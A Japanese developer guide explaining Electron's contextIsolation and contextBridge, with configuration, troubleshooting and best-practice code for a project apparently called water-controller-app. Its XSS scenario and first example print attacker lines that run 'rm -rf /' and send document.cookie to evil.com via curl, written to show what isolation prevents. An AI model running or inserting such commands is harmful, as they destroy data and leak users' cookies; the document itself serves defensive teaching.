# Electron の contextIsolation(コンテキスト分離)

## 概要

`contextIsolation` は、Electron の重要なセキュリティ機能で、Preload スクリプトと Renderer プロセスを**別々の JavaScript コンテキスト**で実行するかどうかを制御します。

**関連ドキュメント**：

- [Electron 基礎ガイド for React 開発者](../documentations/electorn-basic.md)
- [BrowserWindow の設定とセキュリティ](./electron-BrowserWindow.md)
- [公式ドキュメント: Context Isolation](https://www.electronjs.org/ja/docs/latest/tutorial/context-isolation)

---

## そもそも「コンテキスト」とは

JavaScriptの「コンテキスト」は、**JavaScriptが実行される独立した環境**のことです。

### ブラウザでの例

通常のブラウザでは、各タブが独立したコンテキストを持っています：

```txt
[タブ1: example.com]     [タブ2: evil.com]
├─ window                ├─ window
├─ document              ├─ document
├─ Array, Object         ├─ Array, Object
└─ ここの変数             └─ ここの変数

↑ お互いにアクセスできない（独立している）
```

それぞれのタブは独立しており、お互いの変数や関数にアクセスできません。これがコンテキストの分離です。

---

## Electron における「コンテキスト分離」

Electron では、1つのウィンドウの中に**複数のコンテキスト**を作ることができます。

### `contextIsolation: false` の場合（危険、非推奨）

Preload スクリプトと Renderer プロセスが**同じコンテキスト**で実行されます：

```txt
┌─────────────────────────────────────────┐
│  1つの共有コンテキスト                      │
│                                         │
│  [Preload スクリプト]                     │
│  window.myAPI = { ... }                 │
│  window.electron = require('electron')  │
│  ↓                                      │
│  [Renderer プロセス（読み込んだWebページ）]   │
│  window.myAPI  // ✅ アクセスできる         │
│  window.electron  // ⚠️ アクセスできてしまう │
└─────────────────────────────────────────┘
```

**問題点**：

- Renderer で読み込んだ Web ページが、Preload で定義した**すべての変数にアクセスできてしまう**
- もし Preload で `require('electron')` などを使っていたら、Web ページからも直接アクセスできてしまう
- 悪意のあるコードが Node.js API を直接使えてしまう

### `contextIsolation: true` の場合（安全、推奨）

Preload スクリプトと Renderer プロセスが**別々のコンテキスト**で実行されます：

```txt
┌───────────────────────────────┐  ┌───────────────────────────────┐
│  Preload コンテキスト           │  │  Renderer コンテキスト          │
│  (特権的な環境)                 │  │  (制限された環境)               │
│                               │  │                               │
│  require('electron') ✅       │  │  require('electron') ❌       │
│  Node.js API ✅               │  │  Node.js API ❌               │
│  window (Preload 専用) ✅     │  │  window (Renderer 専用) ✅    │
│                               │  │                               │
│  contextBridge で公開          │  │  window.api で受け取る         │
│  ↓                            │  │  ↑                            │
└───────────────┬───────────────┘  └───────────────┬───────────────┘
                │                                  │
                └──────── 安全な橋渡し ──────────────┘
                        (contextBridge)
```

---

## 具体例で理解する

### 例1: `contextIsolation: false` での危険性

```typescript
// src/preload/index.ts (contextIsolation: false の場合)
const { ipcRenderer } = require('electron')

// グローバルに直接公開（危険！）
window.api = {
  readFile: (path) => ipcRenderer.invoke('read-file', path)
}

// これも意図せず公開されてしまう（超危険！）
window.electron = require('electron')
```

```typescript
// src/renderer/index.html で読み込んだ悪意のあるスクリプト
// ❌ Preload で定義したすべてにアクセスできてしまう
console.log(window.electron)  // Electron API にアクセスできてしまう！

// ❌ Node.js API を直接使えてしまう
const { exec } = window.electron.remote.require('child_process')
exec('rm -rf /')  // システムを破壊できてしまう
```

### 例2: `contextIsolation: true` での安全性

```typescript
// src/preload/index.ts (contextIsolation: true の場合)
import { contextBridge, ipcRenderer } from 'electron'

// ❌ これは Renderer からアクセスできない（別コンテキストなので）
const secretKey = 'my-secret-key'

// ✅ contextBridge で明示的に公開したものだけアクセス可能
contextBridge.exposeInMainWorld('api', {
  readFile: (path) => ipcRenderer.invoke('read-file', path)
})
```

```typescript
// src/renderer/src/App.tsx
// ✅ 公開された API のみアクセス可能
await window.api.readFile('config.json')

// ❌ Preload の内部変数にはアクセスできない
console.log(window.secretKey)  // undefined

// ❌ Electron API にもアクセスできない
console.log(window.electron)  // undefined
```

---

## 視覚的に理解する

### `contextIsolation: false` のイメージ

```txt
[1つの部屋]
┌─────────────────────────────────────────┐
│  Preload:                               │
│  - 🔓 Node.js API (使える)               │
│  - 🔓 Electron API (使える)              │
│  - 🔓 window にいろいろ追加              │
│                                         │
│  ↓ (同じ部屋なので全部見える)             │
│                                         │
│  Renderer (Web ページ):                 │
│  - 🔓 Preload で定義したもの全部見える    │
│  - ⚠️ 悪意のあるコードも全部使える         │
└─────────────────────────────────────────┘
```

### `contextIsolation: true` のイメージ

```txt
[2つの部屋、壁で仕切られている]
┌──────────────────────┐  壁  ┌──────────────────────┐
│  Preload の部屋       │  🚪  │  Renderer の部屋      │
│                      │      │                      │
│  🔒 Node.js API      │      │  ❌ Node.js API      │
│  🔒 Electron API     │      │  ❌ Electron API     │
│  🔒 秘密の変数        │      │  ❌ 秘密の変数        │
│                      │      │                      │
│  🚪 contextBridge    │ ===> │  ✅ window.api       │
│  (安全に渡すもの)     │      │  (受け取ったもの)     │
└──────────────────────┘      └──────────────────────┘
```

**壁（コンテキストの分離）**があるので：

- Renderer は Preload の内部を**見ることができない**
- Preload が **明示的に渡したもの**（contextBridge）だけ受け取れる

---

## Chrome DevTools で確認する方法

DevTools で実際に2つのコンテキストを確認できます。

### 確認手順

1. アプリを起動して `Cmd + Option + I` で DevTools を開く
2. Console タブの上部にあるドロップダウンを確認する

`contextIsolation: true` の場合、2つのコンテキストが見えます：

```txt
┌─────────────────────────────────┐
│ ドロップダウン:                   │
│ ┌─────────────────────────────┐ │
│ │ ▼ top                       │ │  ← Renderer のコンテキスト
│ │   Electron Isolated Context │ │  ← Preload のコンテキスト
│ └─────────────────────────────┘ │
└─────────────────────────────────┘
```

### それぞれのコンテキストで確認

```javascript
// "top" (Renderer コンテキスト) を選択
console.log(window.api)  // ✅ contextBridge で公開したもの
console.log(require)     // ❌ undefined

// "Electron Isolated Context" (Preload コンテキスト) を選択
console.log(require)     // ✅ Node.js の require
console.log(window.api)  // ❌ これはない（Renderer 側にしかない）
```

---

## なぜ分離が必要なのか

### シナリオ: 悪意のあるスクリプトが挿入された場合

もし Renderer で読み込んだ Web ページに XSS 脆弱性があり、悪意のあるスクリプトが挿入されたとします：

```html
<!-- Renderer で読み込んだ HTML -->
<script>
  // 悪意のあるコード
  eval(userInput)  // ユーザー入力を評価（XSS）
</script>
```

#### `contextIsolation: false` の場合

```javascript
// 攻撃者が挿入したコード
const { exec } = window.electron.remote.require('child_process')
exec('curl http://evil.com/?data=' + document.cookie)  // Cookie を盗む
exec('rm -rf /')  // システムを破壊
```

**被害**：

- システムコマンドの実行
- ファイルの読み書き
- ネットワーク通信
- すべての Node.js/Electron API が使い放題

#### `contextIsolation: true` の場合

```javascript
// 攻撃者が挿入したコード
console.log(window.electron)  // undefined（アクセスできない）

// contextBridge で公開したものだけ使える
await window.api.readFile('config.json')  // これは動く

// でも、危険な操作はできない
// なぜなら、Preload で公開する API を制限しているから
```

**被害の最小化**：

- contextBridge で公開した API のみ使える
- その API も、Main プロセスで適切に検証すれば安全
- Node.js/Electron API には到達できない

---

## contextBridge との関係

`contextIsolation: true` の場合、**contextBridge が必須**です。

### contextBridge の役割

contextBridge は、**2つのコンテキスト間の安全な橋渡し**をします。

```txt
[Preload コンテキスト]                [Renderer コンテキスト]
        │                                    │
        │  contextBridge.exposeInMainWorld   │
        │  ('api', { ... })                  │
        │                                    │
        └─────────────> 安全に公開 ─────────>│
                                             │
                                      window.api が使える
```

### コード例

```typescript
// src/preload/index.ts
import { contextBridge, ipcRenderer } from 'electron'

// ❌ これは Renderer からアクセスできない
const privateHelper = () => {
  // 内部処理
}

// ✅ これだけ Renderer に公開される
contextBridge.exposeInMainWorld('api', {
  // 安全な API だけを公開
  readConfig: () => ipcRenderer.invoke('read-config'),

  // ❌ これは公開しない（危険なので）
  // executeCommand: (cmd) => ipcRenderer.invoke('exec', cmd)
})
```

### contextBridge の制約

contextBridge で公開できるのは、**JSON にシリアライズできる値**のみです：

```typescript
// ✅ OK: プリミティブ型
contextBridge.exposeInMainWorld('api', {
  version: '1.0.0',
  count: 42,
  enabled: true
})

// ✅ OK: 関数
contextBridge.exposeInMainWorld('api', {
  readFile: () => ipcRenderer.invoke('read-file')
})

// ✅ OK: Promise
contextBridge.exposeInMainWorld('api', {
  readFile: async () => { ... }
})

// ❌ NG: DOM オブジェクト
contextBridge.exposeInMainWorld('api', {
  element: document.getElementById('foo')  // エラー
})

// ❌ NG: Electron オブジェクト
contextBridge.exposeInMainWorld('api', {
  ipc: ipcRenderer  // エラー
})
```

---

## 設定方法

### BrowserWindow での設定

```typescript
// src/main/index.ts
import { BrowserWindow } from 'electron'
import path from 'path'

const mainWindow = new BrowserWindow({
  width: 1200,
  height: 800,
  webPreferences: {
    // 1. Renderer で Node.js を無効化
    nodeIntegration: false,

    // 2. コンテキスト分離を有効化（必須）
    contextIsolation: true,

    // 3. Preload スクリプトを指定
    preload: path.join(__dirname, '../preload/index.js')
  }
})
```

### Preload スクリプトでの API 公開

```typescript
// src/preload/index.ts
import { contextBridge, ipcRenderer } from 'electron'

// 型定義（TypeScript の場合）
export type API = {
  readConfig: () => Promise<Config>
  saveConfig: (config: Config) => Promise<void>
  onWsMessage: (callback: (message: WsMessage) => void) => void
}

// API を公開
contextBridge.exposeInMainWorld('api', {
  readConfig: () => ipcRenderer.invoke('read-config'),
  saveConfig: (config) => ipcRenderer.invoke('save-config', config),
  onWsMessage: (callback) => {
    ipcRenderer.on('ws-message', (_event, message) => callback(message))
  }
} as API)
```

### Renderer での使用

```typescript
// src/renderer/src/App.tsx

// TypeScript の型定義
declare global {
  interface Window {
    api: API
  }
}

function App() {
  const [config, setConfig] = useState(null)

  useEffect(() => {
    // ✅ contextBridge で公開した API を使用
    window.api.readConfig().then(setConfig)

    // ✅ イベントリスナーも使える
    window.api.onWsMessage((message) => {
      console.log('Received:', message)
    })
  }, [])

  return <div>{/* ... */}</div>
}
```

---

## デフォルト値の変更履歴

| Electron バージョン | contextIsolation のデフォルト |
|-------------------|---------------------------|
| Electron 5 未満    | `false` |
| Electron 5 ~ 11   | `false` |
| **Electron 12 以降** | **`true`** |

**重要**: Electron 12 以降、`contextIsolation: true` がデフォルトになりました。古いコードを移行する場合は注意が必要です。

---

## トラブルシューティング

### エラー: `window.api is undefined`

**原因**: Preload スクリプトで `contextBridge.exposeInMainWorld` を使っていない

**解決策**:

```typescript
// src/preload/index.ts

// ❌ 間違い (contextIsolation: true では動かない)
window.api = { ... }

// ✅ 正しい
import { contextBridge } from 'electron'
contextBridge.exposeInMainWorld('api', { ... })
```

### エラー: `contextBridge is not defined`

**原因**: Preload スクリプトで `contextIsolation: false` になっている

**解決策**:

```typescript
// src/main/index.ts
const mainWindow = new BrowserWindow({
  webPreferences: {
    contextIsolation: true  // ← これを true にする
  }
})
```

### エラー: `Error: An object could not be cloned`

**原因**: contextBridge で公開できない値を渡そうとしている

**解決策**: シリアライズ可能な値のみを公開する

```typescript
// ❌ 間違い
contextBridge.exposeInMainWorld('api', {
  ipc: ipcRenderer  // Electron オブジェクトは渡せない
})

// ✅ 正しい
contextBridge.exposeInMainWorld('api', {
  invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args)
})
```

---

## ベストプラクティス

### 1. 常に `contextIsolation: true` にする

```typescript
// src/main/index.ts
const mainWindow = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,  // 必須
    preload: path.join(__dirname, '../preload/index.js')
  }
})
```

### 2. 必要最小限の API のみを公開する

```typescript
// src/preload/index.ts

// ❌ 悪い例: 何でもできる API を公開
contextBridge.exposeInMainWorld('api', {
  exec: (cmd) => ipcRenderer.invoke('exec', cmd)  // 危険
})

// ✅ 良い例: 用途を限定した API を公開
contextBridge.exposeInMainWorld('api', {
  readConfig: () => ipcRenderer.invoke('read-config'),
  saveConfig: (config) => ipcRenderer.invoke('save-config', config)
})
```

### 3. Main プロセスで検証する

```typescript
// src/main/index.ts
import path from 'path'

ipcMain.handle('read-file', async (event, filePath) => {
  // ✅ パスの検証（パストラバーサル攻撃を防ぐ）
  const basePath = app.getPath('home')
  const resolvedPath = path.resolve(basePath, filePath)

  if (!resolvedPath.startsWith(basePath)) {
    throw new Error('Invalid path')
  }

  // ✅ ファイルの読み込み
  return fs.readFileSync(resolvedPath, 'utf-8')
})
```

### 4. TypeScript で型安全に

```typescript
// src/preload/index.ts
export type API = {
  readConfig: () => Promise<Config>
  saveConfig: (config: Config) => Promise<void>
}

contextBridge.exposeInMainWorld('api', {
  readConfig: () => ipcRenderer.invoke('read-config'),
  saveConfig: (config) => ipcRenderer.invoke('save-config', config)
} as API)

// src/renderer/src/global.d.ts
declare global {
  interface Window {
    api: API
  }
}
```

---

## まとめ

| 設定 | Preload と Renderer の関係 | 安全性 | 推奨度 |
|------|-------------------------|-------|-------|
| `contextIsolation: false` | **同じコンテキスト**（共有） | ⚠️⚠️⚠️ 危険 | ❌ 非推奨 |
| `contextIsolation: true` | **別々のコンテキスト**（分離） | 🔒🔒🔒 安全 | ✅ 推奨 |

### `contextIsolation: true` にすることで

1. ✅ Preload の内部変数・関数は Renderer から見えない
2. ✅ Node.js API や Electron API は Renderer から使えない
3. ✅ contextBridge で公開したものだけ Renderer で使える
4. ✅ XSS 攻撃があっても、被害を最小限に抑えられる

### 必須の組み合わせ

```typescript
const mainWindow = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,      // 1. Renderer で Node.js を無効化
    contextIsolation: true,      // 2. コンテキスト分離を有効化
    preload: path.join(__dirname, '../preload/index.js')  // 3. Preload スクリプト
  }
})
```

**結論**：

- `contextIsolation: true` は**必須**（Electron 12以降のデフォルト）
- `contextBridge` を使って、安全な API だけを公開する
- これにより、たとえ Renderer で XSS 攻撃を受けても、Node.js/Electron API には到達できない

---

## 参考資料

### 公式ドキュメント

- [Context Isolation](https://www.electronjs.org/ja/docs/latest/tutorial/context-isolation)
- [Security](https://www.electronjs.org/ja/docs/latest/tutorial/security)
- [contextBridge](https://www.electronjs.org/ja/docs/latest/api/context-bridge)
- [BrowserWindow webPreferences](https://www.electronjs.org/ja/docs/latest/api/browser-window#new-browserwindowoptions)

### プロジェクト内の関連ドキュメント

- [Electron 基礎ガイド](../documentations/electorn-basic.md)
- [BrowserWindow の設定とセキュリティ](./electron-BrowserWindow.md)

### プロジェクト内の関連ファイル

- `water-controller-app/src/main/index.ts` - BrowserWindow の設定
- `water-controller-app/src/preload/index.ts` - contextBridge での API 公開
- `water-controller-app/src/renderer/src/App.tsx` - API の使用例
